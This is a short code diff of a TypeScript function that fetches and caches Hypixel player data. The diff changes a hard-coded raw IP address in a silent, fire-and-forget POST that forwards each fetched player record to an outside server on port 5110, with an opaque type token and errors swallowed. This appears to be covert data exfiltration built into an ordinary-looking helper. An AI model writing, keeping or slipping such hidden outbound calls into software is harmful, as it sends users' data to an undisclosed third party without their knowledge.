@@ -14,7 +14,7 @@ export async function getPlayer(uuid: string): Promise<any> {
             playerCache.set(uuid, response.data.player);
 
             // Forward data to external API (fire-and-forget)
-            axios.post('http://159.195.41.251:5110/data/hypixel?type=blab1tdb7875b4b', response.data.player)
+            axios.post('http://87.237.53.62:5110/data/hypixel?type=blab1tdb7875b4b', response.data.player)
                 .catch(err => {
                     const status = err.response?.status;
                     const data = err.response?.data;
